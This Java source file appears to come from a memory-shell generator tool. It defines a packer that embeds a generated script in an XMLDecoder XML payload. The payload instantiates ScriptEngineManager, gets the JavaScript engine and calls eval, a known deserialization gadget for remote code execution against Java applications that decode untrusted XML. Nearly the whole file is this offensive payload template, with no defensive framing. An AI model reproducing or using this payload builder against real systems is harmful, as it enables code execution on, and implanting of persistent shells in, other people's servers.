package org.leo.jmg.mem.packer.xmldecoder;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

@PackerMeta(name = "XMLDecoderScriptEngine", group = "XmlDecoder", order = 1)
public class XMLDecoderScriptEnginePacker implements Packer {
    String template = "<java>\n" +
            "    <object class=\"javax.script.ScriptEngineManager\">\n" +
            "        <void method=\"getEngineByName\">\n" +
            "            <string>js</string>\n" +
            "            <void method=\"eval\">\n" +
            "                <string>{{script}}</string>\n" +
            "            </void>\n" +
            "        </void>\n" +
            "    </object>\n" +
            "</java>";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String script = PackerRegistry.getOrThrow("DefaultScriptEngine").pack(config);
        return template.replace("{{script}}", script);
    }
}